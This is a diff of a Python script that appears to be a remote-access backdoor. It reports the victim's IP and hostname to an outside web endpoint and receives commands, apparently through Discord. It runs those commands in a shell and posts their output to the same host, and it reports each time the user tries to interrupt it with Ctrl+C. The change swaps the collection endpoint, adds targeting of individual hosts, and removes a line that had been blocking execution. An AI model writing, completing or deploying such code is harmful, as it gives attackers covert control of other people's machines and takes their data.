@@ -2,16 +2,18 @@ try:
     from requests import get, post
     from time import sleep
     from subprocess import check_output as system
-    from os import chdir
+    from os import chdir, uname
 
     old_command = ""
     command = ""
 
     ip = get('https://api.ipify.org').content.decode('utf8')
-    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: `{ip}`")
+    hostname = uname()[1]
+    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
 except KeyboardInterrupt:
     try:
-        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when init``")
+        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname} ``Client tried to SIGINT(Ctrl+C) when init``")
+        pass
     except KeyboardInterrupt:
         pass
     pass
@@ -27,9 +29,9 @@ while True:
                     sleep(5)
                     continue
                 except KeyboardInterrupt:
-                    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
+                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
         except KeyboardInterrupt:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
+            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
             continue
         except:
             print("Failed to connect to server")
@@ -38,11 +40,17 @@ while True:
             # execute command
         if old_command != command:
             try:
+                if command.startswith("execute "):
+                    if command.split()[1] == hostname:
+                         pass
+                    else:
+                        old_command = command
+                        continue
                 if command.startswith("ping"):
                     try:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
                     except:
                         print("Failed to connect to server")
                         continue
@@ -52,17 +60,16 @@ while True:
                         chdir(dir)
                     except KeyboardInterrupt:
                         try:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                         except KeyboardInterrupt:
                             continue
                         continue
                     except FileNotFoundError:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```No Such Directory```-{ip}")
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                     except:
                         print("Failed to connect to server")
                         continue
                 old_command = command
-                continue
                 try:
                     cmdout = system(command, shell=True).decode()
                 except subprocess.CalledProcessError as e:
@@ -73,12 +80,12 @@ while True:
                         continue
                     try:
                         if e.output != "":
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Error: {e.output} exited with code {e.returncode}```- {ip}")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output} exited with code {e.returncode}```- {ip}@{hostname}")
                         else:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}@{hostname}")
                     except KeyboardInterrupt:
                         try:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
                         except KeyboardInterrupt:
                                 continue
                         continue
@@ -87,7 +94,7 @@ while True:
                         continue
                 except KeyboardInterrupt:
                     try:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to execute command``")
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to execute command``")
                     except KeyboardInterrupt:
                             continue
                     continue
@@ -95,10 +102,10 @@ while True:
                 if not sperror:
                     if cmdout != "":
                         try:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```- {ip}")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```{cmdout}```- {ip}@{hostname}")
                         except KeyboardInterrupt:
                             try:
-                                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                             except KeyboardInterrupt:
                                     continue
                             continue
@@ -107,10 +114,10 @@ while True:
                             continue
                     else:
                         try:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
                         except KeyboardInterrupt:
                             try:
-                                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                             except KeyboardInterrupt:
                                     continue
                             continue
@@ -125,13 +132,13 @@ while True:
             sleep(0.1)
         except KeyboardInterrupt:
             try:
-                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
             except KeyboardInterrupt:
                 continue
             continue
     except KeyboardInterrupt:
         try:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
+            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
         except KeyboardInterrupt:
             continue
         continue
